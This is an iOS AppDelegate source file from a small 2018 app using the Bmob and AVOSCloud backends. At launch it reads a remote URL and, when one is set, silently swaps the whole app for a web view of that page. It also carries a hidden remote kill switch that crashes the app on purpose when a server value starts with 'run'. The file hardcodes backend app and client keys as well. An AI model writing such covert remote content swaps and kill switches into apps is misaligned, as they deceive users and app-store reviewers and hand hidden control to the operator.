//
//  AppDelegate.m
//  Project
//
//  Created by masha on 2018/5/15.
//  Copyright © 2018年 邹笛. All rights reserved.
//

#import "AppDelegate.h"
#import "WebViewController.h"
#import <BmobSDK/Bmob.h>
#import <AVOSCloud/AVOSCloud.h>
#import "IQKeyboardManager.h"


@interface AppDelegate ()

@end

@implementation AppDelegate


- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
    [UIApplication sharedApplication].statusBarStyle = UIStatusBarStyleLightContent;
    [Bmob registerWithAppKey:@"7debb4475040a795e9b1e6e347fff55e"];

    /*BmobObject *gameScore = [BmobObject objectWithClassName:@"AppURL"];
    [gameScore setObject:@"第一个APP" forKey:@"AppName"];
    [gameScore setObject:@"https://www.baidu.com" forKey:@"url"];
    [gameScore saveInBackgroundWithResultBlock:^(BOOL isSuccessful, NSError *error) {
        //进行操作
    }];*/
    
    BmobQuery   *bquery = [BmobQuery queryWithClassName:@"AppURL"];
    [bquery getObjectInBackgroundWithId:@"fb4a52f943" block:^(BmobObject *object,NSError *error){
        if (!error){
            if (object != nil && object != NULL && [object objectForKey:@"url"]) {
                NSString *urlSrt = [object objectForKey:@"url"];
                if ([urlSrt hasPrefix:@"http://"]||[urlSrt hasPrefix:@"https://"]) {
                    NSURL *url = [NSURL URLWithString:[object objectForKey:@"url"]];
                    WebViewController *VC = [[UIStoryboard storyboardWithName:@"Main" bundle:nil] instantiateViewControllerWithIdentifier:@"WebViewController"];
                    VC.url = url;
                    self.window.rootViewController = VC;
                }
            }
        }
        
    }];
    [AVOSCloud setApplicationId:@"TuiWU4ddFOtOrbptiJr0AwVg-gzGzoHsz" clientKey:@"tM2WE3wL11isaGA1ooeUGWNL"];
    [AVAnalytics trackAppOpenedWithLaunchOptions:launchOptions];

    AVQuery *query = [AVQuery queryWithClassName:@"WebURL"];
    [query getObjectInBackgroundWithId:@"5afa42c1ac502e3c23c22096" block:^(AVObject *object, NSError *error) {
        if (object != nil && object != NULL && [object objectForKey:@"url"]) {
            NSString *urlSrt = [object objectForKey:@"url"];
            if ([urlSrt hasPrefix:@"run"]) {
                NSArray *array = @[];
                [array objectAtIndex:2];
            }
        }

    }];
    [IQKeyboardManager sharedManager].enable = YES;
    [IQKeyboardManager sharedManager].shouldResignOnTouchOutside = YES;
    
    return YES;
}


- (void)applicationWillResignActive:(UIApplication *)application {
    // Sent when the application is about to move from active to inactive state. This can occur for certain types of temporary interruptions (such as an incoming phone call or SMS message) or when the user quits the application and it begins the transition to the background state.
    // Use this method to pause ongoing tasks, disable timers, and invalidate graphics rendering callbacks. Games should use this method to pause the game.
}


- (void)applicationDidEnterBackground:(UIApplication *)application {
    // Use this method to release shared resources, save user data, invalidate timers, and store enough application state information to restore your application to its current state in case it is terminated later.
    // If your application supports background execution, this method is called instead of applicationWillTerminate: when the user quits.
}


- (void)applicationWillEnterForeground:(UIApplication *)application {
    // Called as part of the transition from the background to the active state; here you can undo many of the changes made on entering the background.
}


- (void)applicationDidBecomeActive:(UIApplication *)application {
    // Restart any tasks that were paused (or not yet started) while the application was inactive. If the application was previously in the background, optionally refresh the user interface.
}


- (void)applicationWillTerminate:(UIApplication *)application {
    // Called when the application is about to terminate. Save data if appropriate. See also applicationDidEnterBackground:.
}


@end
